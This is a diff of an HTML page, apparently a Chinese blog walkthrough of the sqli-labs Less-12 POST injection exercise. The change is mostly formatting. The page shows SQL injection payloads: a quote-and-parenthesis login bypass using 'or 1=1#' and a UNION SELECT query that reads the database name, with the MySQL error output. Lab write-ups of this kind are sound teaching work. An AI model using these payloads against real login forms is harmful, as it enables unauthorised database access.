@@ -88,7 +88,7 @@
 <meta property="og:url" content="http://ju5tw4nty0u.top/2018/03/23/SQL-LABS入门到放弃5（part1）/index.html">
 <meta property="og:site_name" content="JWYBlog">
 <meta property="og:description" content="前言前面的关卡都是基于get请求的，从这个关卡起，我们就要走进post注入的世界了，什么是post呢？就是数据从客户端提交到服务器端，例如在登录过程中输入的用户名和密码，这些数据以表单的形式提交到服务器端，然后在服务器端进行验证（一堆废话23333 基础知识让我们来熟悉一下一次POST请求和数据库交互的过程吧。  提交正常的username和password 1username=ju5tw4nty">
-<meta property="og:updated_time" content="2018-03-26T09:09:18.620Z">
+<meta property="og:updated_time" content="2018-03-26T09:12:36.358Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL-LABS入门到放弃5（part1）">
 <meta name="twitter:description" content="前言前面的关卡都是基于get请求的，从这个关卡起，我们就要走进post注入的世界了，什么是post呢？就是数据从客户端提交到服务器端，例如在登录过程中输入的用户名和密码，这些数据以表单的形式提交到服务器端，然后在服务器端进行验证（一堆废话23333 基础知识让我们来熟悉一下一次POST请求和数据库交互的过程吧。  提交正常的username和password 1username=ju5tw4nty">
@@ -464,12 +464,11 @@
 </li>
 </ol>
 <h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><ol>
-<li>尝试输入<code>uname=ju5tw4nty0u&quot;</code>发现报错<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;123&quot;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<li><p>尝试输入<code>uname=ju5tw4nty0u&quot;</code>发现报错，可知对ID参数做了双引号和括号的处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;123&quot;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
 </li>
-</ol>
-<p>可知对ID参数做了双引号和括号的处理</p>
-<ol>
-<li>可以构造<code>uname=ju5tw4nty0u&quot;) or 1=1#&amp;passwd=123&amp;submit=Submit</code>来绕过</li>
+<li><p>可以构造<code>uname=ju5tw4nty0u&quot;) or 1=1#&amp;passwd=123&amp;submit=Submit</code>来绕过</p>
+</li>
 <li><p>查询数据库</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=ju5tw4nty0u&quot;) union select 1,database()#&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure>
 </li>
